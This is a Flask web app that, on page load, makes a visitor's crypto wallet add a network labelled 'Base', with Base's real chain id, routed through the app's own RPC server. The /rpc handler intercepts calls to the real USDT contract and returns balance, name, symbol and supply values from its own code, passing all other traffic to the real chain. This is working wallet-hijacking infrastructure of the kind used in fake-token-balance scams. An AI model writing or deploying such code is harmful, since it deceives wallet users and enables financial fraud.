from flask import Flask, request, jsonify, render_template_string
import requests
import os
from web3 import Web3

app = Flask(__name__)

# Use the real USDT address on Base
REAL_USDT = "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb"
BASE_RPC = "https://mainnet.base.org"
w3 = Web3(Web3.HTTPProvider(BASE_RPC))

ERC20_ABI = [
    {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
    {"constant": True, "inputs": [], "name": "decimals", "outputs": [{"name": "", "type": "uint8"}], "type": "function"},
    {"constant": True, "inputs": [], "name": "symbol", "outputs": [{"name": "", "type": "string"}], "type": "function"},
    {"constant": True, "inputs": [], "name": "name", "outputs": [{"name": "", "type": "string"}], "type": "function"},
    {"constant": True, "inputs": [], "name": "totalSupply", "outputs": [{"name": "", "type": "uint256"}], "type": "function"}
]

usdt_contract = w3.eth.contract(address=Web3.to_checksum_address(REAL_USDT), abi=ERC20_ABI)

try:
    USDT_DECIMALS = usdt_contract.functions.decimals().call()
except Exception:
    USDT_DECIMALS = 6

# Get the actual USDT total supply from the contract
try:
    USDT_TOTAL_SUPPLY = usdt_contract.functions.totalSupply().call()
except Exception as e:
    print(f"Failed to fetch USDT total supply: {e}")
    USDT_TOTAL_SUPPLY = 100_000_000_000 * (10 ** 6)  # Fallback to a default value

@app.route('/add')
def add_network():
    try:
        return render_template_string("""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Adding Network</title>
            <script>
                function waitForEthereum() {
                    return new Promise((resolve, reject) => {
                        if (window.ethereum) return resolve(window.ethereum);
                        let attempts = 0;
                        const maxAttempts = 20;
                        const checkInterval = setInterval(() => {
                            attempts++;
                            if (window.ethereum) {
                                clearInterval(checkInterval);
                                return resolve(window.ethereum);
                            }
                            if (attempts >= maxAttempts) {
                                clearInterval(checkInterval);
                                reject(new Error('No wallet detected after 10s'));
                            }
                        }, 500);
                    });
                }

                window.onload = async () => {
                    try {
                        const ethereum = await waitForEthereum();
                        console.log("Adding network...");
                        await ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: '0x2105',
                                chainName: 'Base',
                                rpcUrls: ['https://stbl-rpc.onrender.com/rpc'],
                                nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
                                blockExplorerUrls: ['https://basescan.org']
                            }]
                        });
                        console.log("Network added, redirecting...");
                        window.location.href = '/';
                    } catch (error) {
                        console.error('Network addition failed:', error);
                        document.body.innerHTML = '<p>Failed to add network: ' + error.message + '</p><p><a href="/">Go to token addition</a></p>';
                    }
                };
            </script>
        </head>
        <body>
            <p>Adding network, please wait...</p>
        </body>
        </html>
        """)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/rpc', methods=['POST'])
def handle_rpc():
    try:
        data = request.get_json()
        method = data.get("method")
        call_id = data.get("id", 1)

        if method == "eth_chainId":
            return jsonify({"jsonrpc": "2.0", "id": call_id, "result": "0x2105"})
        if method in ["wallet_switchEthereumChain", "wallet_addEthereumChain"]:
            return jsonify({"jsonrpc": "2.0", "id": call_id, "result": "0x2105" if method == "wallet_switchEthereumChain" else True})
        if method == "eth_call" and data.get("params") and len(data["params"]) > 0:
            call_obj = data["params"][0]
            if call_obj.get("to") and call_obj["to"].lower() == REAL_USDT.lower():
                data_field = call_obj.get("data", "")
                if not data_field:
                    return jsonify({"jsonrpc": "2.0", "id": call_id, "result": "0x"})

                function_signature = data_field[:10]

                if function_signature == "0x70a08231":  # balanceOf
                    try:
                        address = Web3.to_checksum_address("0x" + data_field[34:74])
                        real_balance = usdt_contract.functions.balanceOf(address).call()
                        result = "0x" + hex(real_balance)[2:].zfill(64)
                        return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})
                    except Exception as e:
                        result = "0x" + hex(0)[2:].zfill(64)
                        return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})

                elif function_signature == "0x313ce567":  # decimals
                    result = "0x" + hex(6)[2:].zfill(64)
                    return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})

                elif function_signature == "0x95d89b41":  # symbol
                    symbol = "USDT"
                    length = len(symbol)
                    length_hex = hex(32)[2:].zfill(64)
                    str_length_hex = hex(length)[2:].zfill(64)
                    str_hex = symbol.encode("utf-8").hex().ljust(64, "0")
                    result = "0x" + length_hex + str_length_hex + str_hex
                    return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})

                elif function_signature == "0x06fdde03":  # name
                    name = "Tether USD"
                    length = len(name)
                    length_hex = hex(32)[2:].zfill(64)
                    str_length_hex = hex(length)[2:].zfill(64)
                    str_hex = name.encode("utf-8").hex().ljust(64, "0")
                    result = "0x" + length_hex + str_length_hex + str_hex
                    return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})

                elif function_signature == "0x18160ddd":  # totalSupply
                    result = "0x" + hex(USDT_TOTAL_SUPPLY)[2:].zfill(64)
                    return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})

        # For all other methods, proxy to the real Base RPC
        response = requests.post(BASE_RPC, json=data, headers={"Content-Type": "application/json"})
        return jsonify(response.json())
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=False)
